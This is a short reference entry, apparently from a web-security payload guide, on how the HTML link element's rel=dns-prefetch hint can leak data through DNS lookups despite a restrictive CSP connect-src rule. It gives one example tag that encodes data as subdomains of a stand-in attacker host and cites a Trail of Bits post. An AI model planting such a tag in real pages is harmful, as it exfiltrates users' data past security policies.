# Overview

The [&lt;link&gt;](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link) HTML element specifies relationships between the current document and an external resource. This element is most commonly used to link to stylesheets, but is also used to establish site icons (both "favicon" style icons and icons for the home screen and apps on mobile devices) among other things.

# rel=dns-prefetch

The [dns-prefetch](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/dns-prefetch) keyword for the `rel` attribute is a hint to browsers that the user is likely to need resources from the target resource's origin, and therefore the browser can likely improve the user experience by preemptively performing DNS resolution for that origin. It can be used to exfiltrate data in subdomains even with the restrictive CSP `connect-src` directive.

```html
<link rel="dns-prefetch" href="//AAA.BBB.CCC.DDD.attacker.webserver.com">
```

References:
- [Trail of Bits Blog: Escaping misconfigured VSCode extensions](https://blog.trailofbits.com/2023/02/21/vscode-extension-escape-vulnerability/)
